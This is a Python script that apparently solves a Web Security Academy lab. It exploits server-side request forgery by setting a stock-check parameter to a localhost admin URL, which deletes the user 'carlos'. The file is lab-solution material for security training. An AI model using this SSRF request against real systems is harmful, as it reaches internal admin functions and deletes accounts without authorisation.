import requests
import sys



def delete_carlos_user(url, session):
    response = session.post(f"{url}/product/stock", data={"stockApi": "http://localhost/admin/delete?username=carlos"}, timeout=10)
    return "Congratulations, you solved the lab!" in response.text


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", requests.adapters.HTTPAdapter(max_retries=requests.adapters.Retry(total=3, backoff_factor=0.1)))

        print("(+) Deleting the user \"carlos\"...")
        if delete_carlos_user(url, session):
            print("(+) Successfully deleted the user \"carlos\"!")
        else:
            print("(-) Something went wrong. Please check your URL and try again.")


    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")

    except KeyboardInterrupt:
        sys.exit(1)


if __name__ == "__main__":
    main()